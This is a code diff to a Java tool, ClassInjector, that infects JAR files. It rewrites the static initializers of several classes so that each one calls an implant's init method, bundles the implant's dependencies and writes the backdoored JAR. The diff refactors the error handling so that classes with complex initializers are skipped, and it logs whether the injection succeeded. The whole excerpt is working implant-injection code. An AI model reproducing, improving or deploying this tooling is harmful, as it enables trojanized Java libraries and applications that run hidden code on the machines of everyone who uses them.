@@ -73,19 +73,22 @@ public class ClassInjector {
                  * Several classes are infected because it's difficult to know what specific class will be used
                  * by an app.
                  */
-                try {
-                    modifyClinit(currentlyProcessing, implantedClass);
-                } catch (UnsupportedOperationException e) {
-                    log.warning(e.getMessage());
+                boolean didModifyClinit = maybeModifyClinit(currentlyProcessing, implantedClass);
+                if (!didModifyClinit) {
+                    // This class is too weird at the moment. Move on to the next one.
                     continue;
                 }
                 entry.replaceContentWith(asByteArray(currentlyProcessing));
                 countClinitModified++;
                 log.fine("Modified class initializer for '" + entry.getName() + "'.");
             }
-            log.info("Modified the class initializer for  " + countClinitModified + " classes.");
+            if (countClinitModified > 0) {
+                log.info("Modified the class initializer for " + countClinitModified + " classes.");
+            } else {
+                log.warning("No classes with suitable class initializers were found.");
+            }
 
-            boolean didInfect = implantedClass != null;
+            boolean didInfect = implantedClass != null && countClinitModified > 0;
 
             // Add any dependency classes needed for the implant
             if (didInfect) {
@@ -111,9 +114,9 @@ public class ClassInjector {
 
             if (didInfect) {
                 fiddler.write(outputJar);
-                log.info("Wrote output JAR to '" + outputJar + "'.");
+                log.info("Injection successful. Wrote output JAR to '" + outputJar + "'.");
             } else {
-                log.warning("No output JAR was written.");
+                log.warning("Injection failed. No output JAR was written.");
             }
 
             return didInfect;
@@ -122,7 +125,16 @@ public class ClassInjector {
         }
     }
 
-    static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
+    /**
+     * Try to modify the class initializer of a class to include code that invokes the implant.
+     * This method will only modify the class initializer to invoke the implants <code>init</code> method.
+     * The implant class itself must exist on the classpath later when an app uses the modified class.
+     *
+     * @param targetClass  Target class to modify
+     * @param implantClass The implant class
+     * @return true if it was successful, false otherwise
+     */
+    static boolean maybeModifyClinit(ClassFile targetClass, ClassFile implantClass) {
         MethodInfo implantInitMethod = implantClass.getMethod("init");
         if (implantInitMethod == null) {
             throw new UnsupportedOperationException("Implant class does not have a 'public static init()' function.");
@@ -130,7 +142,8 @@ public class ClassInjector {
 
         MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
         if (currentClinit != null && containsInvokeOpcodes(currentClinit)) {
-            throw new UnsupportedOperationException("Non-trivial <clinit> in '" + targetClass.getName() + "'. Skipping infection of this class.");
+            log.fine("Non-trivial <clinit> in '" + targetClass.getName() + "'. Skipping infection of this class.");
+            return false;
         }
         if (currentClinit == null) {
             // The target does not already have a class initializer (aka <clinit>) to merge implant code into.
@@ -152,6 +165,8 @@ public class ClassInjector {
         concatenatedCode.put(currentClinitCodeAttr.getCode());
         CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
         currentClinit.setCodeAttribute(newCodeAttribute);
+
+        return true;
     }
 
     private static boolean containsInvokeOpcodes(MethodInfo clinit) {
